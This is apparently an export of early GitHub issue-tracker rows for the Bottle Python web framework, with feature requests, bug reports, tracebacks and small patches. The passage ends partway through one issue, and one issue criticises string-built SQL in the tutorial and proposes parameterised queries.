91,"Support ""Range"" headers in static_file()",2010-08-13T08:16:28Z,2011-12-08T15:05:43Z,Request,,,"> HTTP retrieval requests ... MAY request one or more sub-ranges of the entity, instead of the entire entity, using the Range request header ... A server MAY ignore the Range header.

Simple ranges (Range: 123-456) should be easy to implement. Multiple range support (Range: 8-16,32-64) requires a rather complex file-wrapper or iterator. I don't know if these are used in the wild, so lets just implement simple ranges for now.
"
90,Reloading server dies on slow hardware.,2010-08-10T08:56:34Z,2010-08-11T18:06:04Z,Bug,,,"If the reloading observer process is not able to touch the lockfile for more than one second (after sleeping for a second), the child terminates because it assumes the observer died. This can happen on very slow or busy hardware. Increasing the run(interval) setting helps, but slows down the overall responsiveness of the reloading feature. A dying observer process is relatively rare, so the timeout could be interval*3 or more instead of interval*2. 
"
89,Accept a list of routes in @route(),2010-08-05T07:55:06Z,2010-08-06T03:45:07Z,Request,,,"This could be useful:

```
@route(['/', '/index.html', '/start'])
def index()
    pass
```
"
88,slash issue when using mount,2010-07-31T11:10:51Z,2011-10-01T12:53:12Z,"Request, Undecided",,,"I just mount a app to some path, e.g.:
mount(app, '/pb')

But if I hit url
http://localhost:8080/pb
I got a 404 error. I have to append a slash to make it work:
http://localhost:8080/pb/

I think this should be fixed to use mount
"
87,FileCheckerThread seems to fail on eggs,2010-07-27T18:58:21Z,2010-07-29T12:10:58Z,Bug,OSError,OSError: [Errno 20] Not a directory: '/usr/local/lib/python2.6/dist-packages/redis-2.0.0-py2.6.egg/redis/client.py',"When starting Bottle 0.8.1 I get the following exception:

Exception in thread Thread-1:
Traceback (most recent call last):
  File ""/usr/lib/python2.6/threading.py"", line 532, in __bootstrap_inner
    self.run()
  File ""/usr/local/choofnik/dynamic/bottle.py"", line 1406, in run
    if path: files[path] = mtime(path)
  File ""/usr/local/choofnik/dynamic/bottle.py"", line 1401, in <lambda>
    mtime = lambda path: os.stat(path).st_mtime
OSError: [Errno 20] Not a directory: '/usr/local/lib/python2.6/dist-packages/redis-2.0.0-py2.6.egg/redis/client.py'

Looking in the dist-packages dir I noticed that the ""client.py"" module resides inside the egg file even though it is returned by the ""inspect.getsourcefile(module)"" which, I think, leads mtime to to err on ""os.stat(path).st_mtime"" since the path actually does not exist per se.

I looked at the trunk and noticed this code hasn't changed. I thought of patching this myself but I was not sure what is the desired behaviour in this case.
"
86,Configurable logging,2010-07-27T13:58:07Z,2014-10-22T19:59:44Z,"Needs input, Request",,,"Bottle currently logs uncaught exceptions directly to wsgi.error. Using the logging-module would be more flexible. 
"
85,fapws accept port as string,2010-07-21T03:39:43Z,2010-08-06T03:45:22Z,Bug,,,"fapws3 0.5 accept string as port, the code should change to (line 1293)
    class FapwsServer(ServerAdapter):
        ......
        evwsgi.start(self.host, str(self.port))
"
84,[plugins] Skip hooks for some routes.,2010-07-20T23:45:02Z,2010-07-26T14:56:57Z,Needs input,,,"Plugins should only affect the app they were installed to. When mounting a sub-applications you usually don't want to run all the hooks of the parent-application. To archive this, we need a way to disable hooks for specific routes. This also helps if you want to disable database-hooks for static_file routes or similar cases.

I see two ways to do this: a) Save metadata along with a route and add a do-not-run-hooks-flag or b) use a decorator to apply hooks only to routes that don't opt out. Both involve some overhead for all routes, even if hooks are not used at all.
"
83,Bottle.get_url() does not return correct path when SCRIPT_NAME is set,2010-07-19T02:22:33Z,2010-07-19T14:03:39Z,Bug,,,"I made a small patch to return the path adjusted for SCRIPT_NAME:

@@ -423,7 +423,8 @@ class Bottle(object):

```
 def get_url(self, routename, **kargs):
     """""" Return a string that matches a named route """"""
```
-        return '/' + self.routes.build(routename, **kargs)
-        return request.environ.get('SCRIPT_NAME', '').rstrip('/') + \
-               '/' + self.routes.build(routename, **kargs)
"
82,Example on http://bottle.paws.de/ create errors in bottle 0.8,2010-07-19T00:27:16Z,2010-07-19T13:43:49Z,Bug,,,"Offending examples:

```
from bottle import request, response

@route('/hello/cookie')
def cookie():
    name = request.COOKIES.get('name', 'Stranger')
    response.header['Content-Type'] = 'text/plain'
    return 'Hello, %s' % name'
```

response.header['Content-Type'] needs to be changed to response.content_type. I had to comb through the source to figure this out; frustrating. 

There may be other inconsistencies in the examples, I'm not familiar enough with bottle to comment on that.
"
81,Auto-Reloader not Ready for a Release.,2010-07-14T10:33:23Z,2010-07-15T14:51:34Z,Bug,,,"There are several bugs and design flaws in the current auto-reloader implementation. As a feature that is widely used during development and frustrating if it does not work, this needs to get fixed before 0.8 is released. I created a new branch to address this: http://github.com/defnull/bottle/tree/reloader-0.8

A critical bug is that the current reloader may jump into an infinite loop and then does not work at all. A more subtile bug is that the safeguard on a dying observer process still does not work. If the observer dies, the child survives and blocks the TCP port forever. You have to touch a module file or kill it manually to close the child. The problem is that there is no portable way for the child to check if its parent process is still alive.

My solution is a reimplementation of the way the processes communicate with each other. The new reloader works similar as the old one:
- The observer process starts a child process and restarts it as long as it returns with exit code 3. All other exit codes cause the observer to die with the same code.
- The child process runs the HTTP server and checks for modified module files in a background thread. As soon as a modification is detected, the child terminates with exit code 3. It does so by interrupting the main thread and allowing the server loop to shutdown gracefully.
- On a KeyboardInterrupt, both processes die with status code 0. (SIGINT propagates to all child processes automatically on most if not all platforms)

Additionally, the observer process now creates a lockfile and updates its modification time attribute periodically. The child process checks for that file. It if is missing or older than a specific number of seconds, it assumes that the observer process died and closes itself. This is the most reliable solution I can think of.

I do not have access to a Windows PC. It _should_ work, but a verification would be nice. Please test this solution if you have access to a platform other than Linux.
"
80,Integration of multipart,2010-07-04T15:38:32Z,,"Needs input, Request",,,"The current multipart-form-parser implementation is broken (because it uses cgi.FieldStorage(), which is broken).There was only a single working implementation (wekzeug) available, but that did not support python 3.x, so I started a new repository to address this issue: http://github.com/defnull/multipart

The new implementation passes all the werkzeug-tests (and some more), works with 3.x, is quite small (300 LoC if you strip out redundant stuff that is already part of Bottle) and already released. I would like to find a way to integrate this into bottle. See #66
"
79,Adapter for WebOb and werkzeug Request and Response objects,2010-07-04T15:03:23Z,2010-08-27T19:08:13Z,Request,,,"It would be nice to be able to use werkzeug and webob with bottle. They both do not do much more than the bottle-builtins do, but this way it is easyer to port existing code or use plugins and libraries that are based on webob or werkzeug.

To keep the adapter-API simple, the points of contact between these objects and the bottle core should be minimized. I will start doing that in the next couple of patches.
"
78,If the parent process is killed (with SIGTERM) the childs survive...,2010-06-03T10:21:06Z,2010-06-30T13:31:59Z,,,,"see L1334
"
77,Template broken?,2010-05-29T21:39:25Z,2010-06-30T08:51:22Z,Bug,,,"The examples at the top of:

http://bottle.paws.de/docs/stpl.html

return lists of words rather than a string.
"
76,unexpected indent,2010-05-28T20:01:44Z,2010-10-16T17:10:12Z,Request,,,"something like this in template
%if not group[""name""]: continue 

causes ""unexpected indent"" exception
"
74,Error if template file don't has a final blank line,2010-05-19T00:35:01Z,2010-05-20T08:33:23Z,,,,"If template file do not has a final blank line, SimpleTemplate gives an IndentationError.
# my template

%for i in range(2):
%end###EOF without a new line

It throws an exception.
"
73,Add Gevent support,2010-05-17T09:02:56Z,2010-06-26T22:45:42Z,Request,,,"<pre>
class GeventServer(ServerAdapter):
    def run(self, handler):
        from gevent import wsgi
        wsgi.WSGIServer((self.host, self.port), handler).serve_forever()
</pre>
"
72,List of dict()'s to JSON,2010-05-16T02:13:41Z,2010-05-16T16:25:39Z,Request,,,"Hey,
would you mind implement the ability to autmatically transform a list of dict()'s to JSON data
as a simple dict() as well?
"
71,Proper API,2010-05-14T03:39:53Z,2010-06-30T13:31:44Z,,,,"I like the tutorial on your website, but I don't find it as useful as seeing the full API of bottle. 
I was just wondering if/when proper bottle documentation will be available?
"
70,Default error template raises an exception when bottle is used inside a package,2010-05-09T16:33:54Z,2010-06-26T22:55:25Z,Bug,ImportError,ImportError: No module named bottle,"When I use bottle module inside a package (e.g. in subfolder 'utils'), in case of error 404 exception is raised:

```
Traceback (most recent call last):
  File ""/usr/lib/python2.6/wsgiref/handlers.py"", line 93, in run
    self.result = application(self.environ, self.start_response)
  File ""/home/user/project/utils/bottle.py"", line 542, in __call__
    out = self._cast(out, request, response)
  File ""/home/user/project/utils/bottle.py"", line 499, in _cast
    return self._cast(self.error_handler.get(out.status, repr)(out), request, response)
  File ""/home/user/project/utils/bottle.py"", line 165, in __repr__
    return ''.join(ERROR_PAGE_TEMPLATE.render(e=self))
  File ""/home/user/project/utils/bottle.py"", line 1611, in render
    self.execute(stdout, **args)
  File ""/home/user/project/utils/bottle.py"", line 1599, in execute
    eval(self.co, env)
  File ""<string>"", line 2, in <module>
ImportError: No module named bottle
```

The problem is in the default error template that contains this code:

```
%from bottle import DEBUG, HTTP_CODES, request
```

which obviously won't work in this situation.
"
69,How to update/reload routes?,2010-05-08T18:34:30Z,2010-08-27T18:49:18Z,Request,,,"My application loads new modules. Modules have new Bottle routes and they import to main module (have routes too). When I delete loaded module, Bottle continue shows deleted module content. I tried to reload Bottle, it's works, but maybe is another, better way without reload all framework?
"
68,add_route is gone in trunk,2010-04-26T08:46:40Z,2010-04-26T17:11:00Z,,,,"I was using add_route in 0.6.4. How do I add a route without using a decorator in trunk ?
"
67,accessing request.POST will fail the first time when it's empty,2010-04-24T17:23:47Z,2010-04-26T16:53:09Z,,,,"```
(Pdb) request.POST
*** TypeError: 'NoneType' object is not iterable
(Pdb) request.POST
{}
```
"
66,Split bottle.py in the repo,2010-04-24T15:11:11Z,,Needs input,,,"While I find the idea of release a single file is a nice release format, I think this should be only done at release timen so the source code is not in one single huge python file and is easier to read / hack.
"
65,autojson fails with empty dicts,2010-04-24T15:07:17Z,2010-04-26T16:51:06Z,,,,"if an empty dict is returned, autojson will fail at making the response a application/json and will not dump the empty dict.
"
64,validate() decorator fails on functions with arguments,2010-04-22T16:35:20Z,2010-08-27T20:07:58Z,Needs input,,,"The decorator makes the assumption the function it decorates only takes keywords.

I've changed it to make it work with any function/method, see:

http://bitbucket.org/tarek/python-weave-client/src/tip/weave/server/decorators.py
"
63,Addition of Rocket Server,2010-04-22T05:20:51Z,2010-04-26T16:25:24Z,,,,"Hi!

I found Rocket Web Server ( https://launchpad.net/rocket ).
It works with Python 2 AND 3.
It should be in Bottle as a choice.
"
62,per route default content type ,2010-04-21T11:26:59Z,2010-09-28T13:53:16Z,"Request, Undecided",,,"After seeing ckreutzer's content type decorator ( http://github.com/ckreutzer/bottle/commit/7eab29fd3a26126d18160cd67dba0ec730e4d97a ) I thought that the API I would like is more like `@route(..., content_type='application/rss+xml')` or `@route(..., content_type='application/atom+xml')`

I experimented on how expensive this would be, and came up with this result:

http://github.com/sgala/bottle/commit/ce1e3683956feeb1c6cfb4daa5d3765977ed1e9f

As you can see, it implied a change to return route instead of target. But still not many changes, and not significant complexity added. I used ""text/html"" (no charset) to ensure it was working. The ""user"" in homepage/app would have one less line, because the feed route would not need to set the content type in the handler...

What do you think?
"
61,Bottle packed with py2exe generates errors,2010-04-19T18:43:28Z,2010-04-20T11:58:32Z,Bug,AttributeError,AttributeError: 'NoneType' object has no attribute 'replace',"When Bottle was packed using py2exe the following error was reported on startup:

Traceback (most recent call last):
  File ""main.py"", line 11, in <module>
  File ""bottle.pyo"", line 1074, in <module>
AttributeError: 'NoneType' object has no attribute 'replace'

The line is:
post.**doc** = route.**doc**.replace('GET','POST')

This happens probably because py2exe compiles to pyo, which has no docstrings.
"
60,Bottle.py 0.8.0 does not run in GAE dev_appserver.py,2010-04-17T10:49:53Z,2010-04-20T12:18:51Z,,,,"See thread here: http://groups.google.com/group/bottlepy/browse_thread/thread/2348eaba02348d89

Attached patch fixes this:

<pre>
--- bottle.py.orig  2010-04-12 21:21:16.000000000 +0100
+++ bottle.py   2010-04-12 21:20:36.000000000 +0100
@@ -601,6 +601,15 @@
         """""" Shortcut for Request.environ.__setitem__ """"""
         self.environ[key] = value
 
+    def __delitem__(self, key):
+        del(self.environ[key])
+
+    def __iter__(self):
+        return iter(self.environ)
+
+    def __len__(self):
+        return len(self.environ)
+
     def keys(self):
         """""" Shortcut for Request.environ.keys() """"""
         return self.environ.keys()
</pre>
"
59,Uploading files; file like object does not return,2010-04-17T05:52:29Z,2010-04-20T12:20:11Z,,,,"From your docs:

Bottle handles file uploads similar to normal POST form data. Instead of strings, you will get file-like objects.

from bottle import route, request
@route('/upload', method='POST')
def do_upload():
    datafile = request.POST.get('datafile')
    return datafile.read()
Here is an example HTML Form for file uploads:

<form action=""/upload"" method=""post"" enctype=""multipart/form-data"">
  <input name=""datafile"" type=""file"" />
</form>


Your missing a submit button to send the post:

<input type=""submit"" value=""upload"">

and

import run

run(host='localhost', port=8080)

For a full working example.

I'd just like to know how to get a file like object from a post. It returns:

Error 500: Internal Server Error

Sorry, the requested URL /upload caused an error:

```
        Unhandled Exception: AttributeError('read',)
```
"
58,How to acces content of uploaded file,2010-04-16T21:30:35Z,2010-04-20T12:00:40Z,,,,"http://bottle.paws.de/docs/tutorial.html#file-uploads says to use datafile.read(), but this gives an error for me. datafile.value works instead.

What is wrong? Documentation or Code? ;)
"
57,"Cannot pass a template variable named ""name"" to a subtemplate",2010-04-12T20:16:25Z,2010-04-20T12:22:13Z,Bug,,,"The signature of `SimpleTemplate.subtemplate` is:

```
def subtemplate(self, name, stdout, **args)
```

Because subtemplate itself uses a parameter called `name`, templates cannot `%include` a child template and pass it a `name` argument, because the resulting Python code will be `_include('<name of template>', _stdout, name='...')`, and Python will raise _TypeError: subtemplate() got multiple values for keyword argument 'name'_.
"
56,SimpleTemplate argument inheritance,2010-04-10T22:30:53Z,2010-10-16T17:17:12Z,"Request, Undecided",,,"Hi, I've just discovered Bottle and I'm really enjoying it. It works pretty much exactly how I'd like a Python Web framework to work.

I'm using Bottle's built-in template engine, and I have an issue with the `rebase` command. When I render a template, I pass in some arguments that control how the header is displayed, like so:

```
return template('welcome', logged_in=is_logged_in(), ...)
```

The `welcome` template rebases itself on `layout`, like so:

```
<h2>Welcome</h2>
<!-- other content -->
%rebase layout title='Welcome', use_js=[]
```

The problem comes when `layout` tries to reference the `logged_in` template variable. That wasn't explicitly passed to `rebase`, so the rendering dies with a NameError: ""name 'logged_in' is not defined"".

Would it make sense for the parent template's arguments to inherit from the child template that rebased onto it? I've patched `SimpleTemplate.execute`'s handling like so:

```
if '_rebase' in env:
    subtpl, rargs = env['_rebase']
    subtpl = self.__class__(name=subtpl, lookup=self.lookup)
    rargs['_base'] = _stdout[:] #copy stdout
    del _stdout[:] # clear stdout

    # inherit arguments from the template that did the rebase:
    all_args = args.copy()
    all_args.update(rargs)
    return subtpl.execute(_stdout, **all_args)
```
"
55,Assigning values that are equal to that of the template page using jinja2_view fails,2010-04-10T09:20:31Z,2010-04-11T13:18:32Z,Bug,,,"@route(""/:VARIABLE"", method=""GET"")
@view('views/PAGENAME.html')
def index_get(VARIABLE):
    class_work = CheckVariable(VARIABLE)
    return dict(title=""Hello"", PAGENAME=CheckVariable(VARIABLE).stringvalue)

PAGENAME.html
{{ PAGENAME }}

Will render something like <bottle.response at ____> and not the string value - e.g. ""hello world"".
"
54,request.auth --> Exception,2010-04-07T19:19:53Z,2010-04-07T19:40:37Z,,,,"Access to request.auth throws exception:

http://paste.pocoo.org/show/198886/
"
53,Application fails on Google App Engine,2010-04-06T08:39:24Z,2010-04-11T18:56:09Z,Needs input,,,"When I try to access to Bottle through GAE I get this exception http://gist.github.com/357361. It seems that GAE has some problems with threading.local module.

GAE starts with
    python dev_appserver.py pybottle -d

Windows XP sp3, Python 2.6.4, GAE 1.2.7

Main file contents this code:

```
from bottle import *

@route('/')
def index():
    return 'Hello World!'
run(server=AppEngineServer) 
```

<b>upd:</b> Threading not supported in GAE http://code.google.com/intl/en/appengine/kb/general.html#libraries
"
52,def POST(self): does not handle all kind sof POST request.,2010-04-05T13:42:39Z,2010-04-05T22:35:02Z,,,,"In case data is in the form of
    FieldStorage(None, None, [MiniFieldStorage('foo', 'bar')])
POST returns a proper MultiDict. But not if the FieldStorage is only of the form
    FieldStorage(None, None, 'foo')
as there is no data.list available obviously.

This case shoudl be handled properly, too. I'm working around the issue with the following, hackish patch:

<pre><code>
diff --git a/bottle.py b/bottle.py
index e422052..7fe82a8 100755
--- a/bottle.py
+++ b/bottle.py
@@ -695,8 +695,11 @@ class Request(threading.local, DictMixin):
                 fb = self.body
             data = cgi.FieldStorage(fp=fb, environ=save_env, keep_blank_values=True)
             self._POST = MultiDict()
-            for item in data.list:
-                self._POST[item.name] = item if item.filename else item.value
+            if data.list:
+                for item in data.list:
+                    self._POST[item.name] = item if item.filename else item.value
+            else:
+                self._POST[data.value] = None
         return self._POST
 
     @property
</code></pre>


which makes the data at least accessible, although on a not such nice way, but it works for me.
"
51,redirect problem ,2010-04-05T09:29:53Z,2010-04-06T14:02:53Z,Undecided,,,"Now, after post something, redirect a page, you should get the page by ""POST"" method, not ""GET"".
For example:
i upload a file , then i want to goto list file page:

  @route('/files', method='GET')

  def file_list():
  pass

so i use ""redirect(""/files""),
it right? Not, i have to  add a post rule on the function ""list"":

  @route('/files', method='GET')
  @route('/files', method='POST') # the new route 

  def file_list():
  pass

And, another problem.
when the explorer redirecting, it always pop a confirm window.  That 's unuseful, i think.
"
50,TypeError exception on accessing request.POST in python 3,2010-04-05T09:07:47Z,2010-04-11T13:19:01Z,Bug,TypeError,TypeError: Type str doesn't support the buffer API,"I am using python 3.1.1 and attempting a simple POST request. This results in an exception - the stacktrace is provided below. I understand that this is related to Python 3 being stricter about byte to str conversion - the question is - how best to handle this issue (and whether this warrants a fix to bottle's code prior to urlparse getting fixed.

Thanks
ign

Traceback (most recent call last):
  File ""c:\python31\lib\site-packages\bottle.py"", line 309, in **call**
    output = handler(**args)
  File ""dispatcher.py"", line 44, in proxygateway
    print(type(request.POST))
  File ""c:\python31\lib\site-packages\bottle.py"", line 390, in POST
    environ=self._environ, keep_blank_values=True)
  File ""c:\python31\lib\cgi.py"", line 489, in __init__
    self.read_urlencoded()
  File ""c:\python31\lib\cgi.py"", line 589, in read_urlencoded
    self.strict_parsing):
  File ""c:\python31\lib\urllib\parse.py"", line 377, in parse_qsl
    pairs = [s2 for s1 in qs.split('&') for s2 in s1.split(';')]
TypeError: Type str doesn't support the buffer API
"
49,Parentheses in routes don't match,2010-04-02T00:14:13Z,2010-04-03T08:27:46Z,Bug,,,"I have a use case where I need to support something like:
@route('/:collection(:key)')

I'm perfectly happy to use a regexp route, but even that seems to not support it correctly.  I think it is due to the yieldroutes function  having '/' in it's pattern spec.

ideas?
"
48,E-Tags for static_file() and Request/Response,2010-03-28T13:19:11Z,,"Request, Undecided",,,"Bottles `send_file()` helper already supports `Last-Modfied` and `If-Modified-Since` headers and sends a `304 Not Modified` response if applicable. A file-name and modification-time based `Etag` and `If-None-Match` support would be easy to implement.

I also want to add support for etags and mtime to normal handler functions. The Idea: `Request.check_mtime()` and `Request.check_etag()` methods that automatically abort execution of the handler function (by throwing a `HTTPResponse(code=304)` exception) on a match and do nothing but adding the header to the response object on a non-match. I'm not sure about the API and its hard to predict side-effects, though.
"
47,request keys are different in fapws3 server,2010-03-23T18:39:41Z,2010-04-20T12:23:41Z,Needs input,KeyError,KeyError: '200',"for example, request['REMOTE_ADDR'] will give error, the server use 'fapws.remote_addr' instead. other keys needs to be mapped too.

besides, the redirect method when using fapws3 gives 
Traceback (most recent call last):
  File ""/bottle.py"", line 653, in app
    return handler(environ, start_response)
  File ""/bottle.py"", line 331, in **call**
    status = '%d %s' % (response.status, HTTP_CODES[response.status])
KeyError: '200'
"
46,Tutorial and Sqlite query building,2010-03-20T10:01:46Z,2010-04-12T16:31:14Z,,,,"Even though the tutorial says that the code should not be used in the wild I find it rather disturbing to see SQL statements being build via string formatting. It will only encourage newbies to do things they should never be doing.

Currently used:
    query = ""INSERT INTO todo (task,status) VALUES ('%s',1)"" %new
    c.execute(query)

suggested:
    query = ""INSERT INTO todo (task,status) VALUES (?,1)""
    c.execute(query, (new,))
"
45,request.POST['var'] is always empty,2010-03-18T04:32:55Z,2010-04-12T16:30:15Z,,,,"I upgraded from 0.6.4 to trunk and POST variables always seem to be empty. The code below works on 0.6.4 but not on trunk.

```
@route('/')
def index():
    return """"""
    <form method=""post"">
      <input type=""text"" name=""name"" />
      <input type=""submit"" />
    </form>
    """"""

@route('/', method='POST')
def hello_post():
    name = request.POST['name']
    return 'Hello %s!' % name
```
"
44,request.is_ajax() method?,2010-03-18T01:01:38Z,2010-04-12T15:15:05Z,Request,,,"I would love an is_ajax() method on the request object, the functionality is described in the Django docs [1].

[1] http://docs.djangoproject.com/en/dev/ref/request-response/#django.http.HttpRequest.is_ajax
"
43,"Form inputs with same name, but multiple values",2010-03-15T15:57:21Z,2010-03-15T16:43:48Z,,,,"I have a case where i want to have 4 types eg: Fruit, Veg, Meat, Dairy. That then have their own values to submit to a form. It uses check boxes with the form like this:

```
<form submit>
    <input type=""checkbox"" name=""fruit"" value=""apple""/>
    <input type=""checkbox"" name=""fruit"" value=""banana""/>
    <input type=""checkbox"" name=""fruit"" value=""cherry""/>
    <input type=""checkbox"" name=""fruit"" value=""kiwi""/>
</form>
```

If I select multiples the last selected is the only one that the POST method sets for that item.name.

I've made some changes to that post method to get this case to work for me, but it sets the default value of a _POST[key] to an empty list.

Here's the patch:

```
diff --git a/bottle.py b/bottle.py
index d97cc23..ba726ef 100755
--- a/bottle.py
+++ b/bottle.py
@@ -694,7 +694,11 @@ class Request(threading.local, DictMixin):
             data = cgi.FieldStorage(fp=fb, environ=save_env)
             self._POST = MultiDict()
             for item in data.list:
-                self._POST[item.name] = item if item.filename else item.value
+                #default being a list
+                if item.name not in self._POST.keys():
+                    self._POST[item.name] = []
+                self._POST[item.name].append(item if item.filename else item.value)
+
         return self._POST

     @property
```

Just wanted to see if that was a case you'd be interested in rolling into the framework, or that name's have to be unique as a note in the docs? Only because it was a bit hard to track down. I'll admit too that may way may not be a very standard way of working, but w3m examples of check boxes, do have some with non-unique names.
"
42,Proposal for asynchronous responses in Bottle,2010-03-15T01:04:08Z,2014-10-22T20:03:17Z,Request,,,"If the Issue tracker is wrong place to discuss this, just let me know.
## Preface:

I'm recently obsessed with Bottle and using it in every web project that allows me to use Python. I love its shocking simplicity and transparency, and the fact that each web request probably only goes through about a hundred lines of python code before getting to my response handler. Totally subjectively, I just love the way it ""feels"" and developing with it makes me all warm and fuzzy inside (as opposed to [Twisted](http://twistedmatrix.com/), which just rubs me the wrong way; or [Tornado](http://www.tornadoweb.org/), which has perfectly reasonable syntax but just not the style I prefer).
## Issue:

I have a few new projects that require a client ""push"" feature, aka comet, long polling, all that stuff. As you probably know, basically all of the possible ways to implement push in the pre-WebSockets era require a web response handler on the backend to block for an extended period of time in some form or another. As you also probably know, a stock WSGI environment will be largely ruined by this, since the entire process will be blocked on a single response handler.

I also use [Redis](http://code.google.com/p/redis/) with [redis-py](http://github.com/andymccurdy/redis-py/) and potentially other blocking client libraries. Scaling for concurrent requests in a non-threaded environment becomes more complicated with any libraries that block on network I/O; it's not always sufficient to just run a whole bunch of Bottle processes. For example, some clients have already had their requests routed by the load balancer to a particular server instance, and if another client on that instance blocks, then the network packets will just sit in the queue for a while, causing slow response times and making poor use of the machine's CPU resources (since it could be doing something else while blocked on network I/O).

Right now I am serving the push feed in a separate [Diesel](http://dieselweb.org/) app. This is not ideal, as I would prefer for the load balancer to distribute across a homogeneous pool of servers all running the same code for simplicity and maintainability reasons (and I don't want to have to monitor multiple process types if I can avoid it). I also don't seem to be able to flush the output buffer and keep going with Diesel's server, killing persistent-request feed options like [MXHR](http://about.digg.com/blog/duistream-and-mxhr), but that's possibly just something I'm doing wrong.
## Proposal:

I propose light-weight support for asynchronous response handlers, possibly with an @async decorator. There seem to be two general camps about the syntax for asynchronous code in this kind of Python environment: callbacks and coroutines. Tornado uses callbacks, which are probably easier to understand but not as elegant and do not really support progressive output (like flushing the output buffer). [Diesel](http://dieselweb.org/) uses coroutines, which can make some pretty elegant ""pythonic"" code and supports pausing repeatedly but can also be hard to wrap one's brain around and be tricky to implement cleanly on the backend. Note that there is also a project called [Swirl](http://code.naeseth.com/swirl/) that brings the coroutine style to Tornado.

Here is a possible syntax style for each option:
#### Callback

```
from bottle import route, async
import time

@route()
@async
def response():
    def doStuff():
        body = ""I like sleep.""
        time.sleep(3)
        body = body + "" Alot.""
        time.sleep(3)
        return body

    def callback():     # Maybe with request & response args?
        return ""OK, I'm awake.""
    # Always return a 2-tuple of a worker callable and a callback callable
    return (doStuff, callback)
```
#### Coroutine

```
from bottle import route, async

@route()
@async
def response():
    yield ""I like sleep.""
    time.sleep(3)    # Or something like yield diesel.sleep(3)
    yield "" Alot.""
    time.sleep(3)    # Or something like yield diesel.sleep(3)
    yield ""OK, I'm awake.""
```

I'd vote for the coroutine option, but it's possible there are implementation issues with it I'm not thinking of.
## The hard part

The really tricky part is that Bottle is not a WSGI server; it always uses another WSGI server (which is usually quite handy). This means that the main application loop is not handled by Bottle but the server (which may be using epoll or libevent or libev or eventlets or Stackless Python or ...).
#### Option 1: Do almost nothing in Bottle

It is possible that really minor modifications to Bottle would allow it to pass through generator return types to the underlying server and hope it supports it. However, builtin libs will still block the entire process (like time.sleep). Diesel and [Cogen](http://code.google.com/p/cogen/) work around this by offering custom functions you have to call instead: `yield diesel.sleep(3)`. [Eventlet](http://eventlet.net/) can actually modify/wrap the builtin packages to be asynchronous, which is pretty nifty. With the minor modification route, the @async decorator might not even be necessary, since Diesel will accept generators automatically. On a side note, Fapws3 claims to be asynchronous, but I have no idea what part of it is asynchronous. It does not seem to support any method of having an asynchronous response handler that I could find; I'll have to ask that community about it since I really like Fapws3 otherwise.
#### Option 2: Do everything in Bottle

It would be awesome if there were a magical way to handle it cleanly all inside of Bottle in a way that worked with all of the possible servers. Bottle would need to track async responses that had not finished, and probably execute async responses in a closure with local request/response object copies. However, I don't know if the underlying WSGI servers (or the rest of the WSGI) would handle having more than one request at a time; I'm not very familiar with WSGI yet. If they also have single global request/response objects like Bottle, they would almost certainly break.

If this approach is possible, [Eventlet](http://eventlet.net/), [Concurrence](http://opensource.hyves.org/concurrence/), and [Cogen](http://code.google.com/p/cogen/) seem like the most likely candidates. Greenlet would probably do the Bottle part at least as efficiently, but it does not directly assist with things like networking.

The theory would be that Bottle would spawn two thread-like-things at the same time: one that just calls the WSGI server's main loop, and one for the pending response book-keeping. Whenever a synchronous response finishes, or an async response yields, the microthread's equivalent of switch() would be called (in the case of Concurrence or Eventlet), or yield (in the case of a Cogen coroutine).
#### Option 3: Require specific WSGI server[s]

I suspect that being asynchronous in Bottle simply will not work with most WSGI servers, and it will require using the WSGI server that comes with the particular async library. Fortunately, Concurrence, Eventlet, and Cogen all offer a WSGI server. There might need to be a global flag in Bottle like the debug flag that enables asynchronous support, and the async decorator would just do pass-through. In asynchronous mode, Bottle could throw an error if the given WSGI server callable is not in a list of known supported async servers.
## My plan

If you don't hate the idea of supporting async requests in Bottle, I would love to make a temporary fork and do some or all of the implementation myself. I would attempt option 3, since it seems the easiest/safest, and I would first attempt with either Cogen or Eventlet. I'm somewhat torn between the two, but I'm leaning towards Cogen since I feel coroutines are more pythonic and elegant than explicit microthread switching (and it doesn't even require hacking the builtin packages like socket or time). Eventlet could make redis-py async automatically, but then it's not clear while looking at the code that a call like `val = redis.get('mykey')` is going to yield. With Cogen you would have to manually yield like `val = yield redis.get('mykey')`, but it's more clear what is happening.

If you've managed to continue reading all the way through this, I'm going to start a fork and play around with it in the hopes that it could get merged into Bottle master. I will probably attempt to first use Cogen, using [this guide](http://cogen.googlecode.com/svn/trunk/docs/build/wsgi/async.html).

What are your thoughts? Do have any interest in Bottle supporting async requests, especially via coroutines? If so, how do you feel about an @async decorator vs. automatically detecting via something like inspect.isgenerator()? Also, once async works, would flushing the output buffer be possible for persistent requests?
"
41,Split request.POST and request.FILES,2010-03-12T21:27:31Z,2010-04-12T15:25:57Z,Request,,,"I'd like to request a request.FILES dict like django and werkzeug have.

Thanks,

Brian
"
40,HTTPErrors fail when @view is used,2010-03-11T20:20:18Z,2010-03-11T21:36:18Z,,,,"The @view decorator expects to get a dict-like object that it pushes into the template.

If, instead, the method returns a HTTPResponse or HTTPError (say because a redirect is needed or something bad happened), @view will pass it to the template, which will error out with a 500 hiding the original error. See, for example, http://bottle.paws.de/page/dont_exist for such an error.

Commit http://github.com/sgala/bottle/commit/20ed798ac0d72a3d9590ad91ccc63622f2414261 offers both a fix (in the wrapper) and a workaround (in the homepage app).

In the commit:
- the wrapper only invokes the template if it gets a dict (it could be made safer using a less strict test...), and
- the app raises the exception instead of returning it to bypass @view processing...

(Note this commit won't apply cleanly as kargs was changed to kwargs in fcc614d6, and also that I have not written a testcase, which I should do...
"
39,Bottle.route,2010-03-09T23:34:04Z,2010-04-12T16:33:55Z,Request,,,"Argument `method` to `Bottle.route` should default to `""ANY""`.
"
38,Canonical way of splitting routes across multiple files,2010-03-09T17:54:26Z,2010-04-12T16:35:17Z,Request,,,"I'm currently developing a large application using bottle and I was wondering if there was a _right way_ of splitting routes across multiple files.

For example, I have an `/admin` section I'd like to put into a specific `admin.py` file. Importing the `admin` module just doesn't do the trick.

More broadly, I'd like to be able to do something along the lines of :

```
import bottle 
import admin
bottle.delegate('/admin', admin)
```

and in `admin.py`

```
import bottle
@bottle.route()
def login():
   pass
```

where `/admin/login` would map to `login`.
"
37,Jinja2 line statement prefix,2010-03-04T18:01:06Z,2010-03-08T00:07:08Z,Request,,,"Are you open to changing the default options you're using for jinja2 templates, or providing a simpler way to override them? The following line is where you setup the jinja2 environment:
    self.env = Environment(line_statement_prefix=""#"", loader=FunctionLoader(self.loader))

However, using '#' as the line statement prefix breaks a common use case (at least it's common for me): inline css definitions with ID selectors. Here's an example of html that will break on it (with jinja2 error ""Encountered unknown tag 'container'""):

```
<html>
<head>
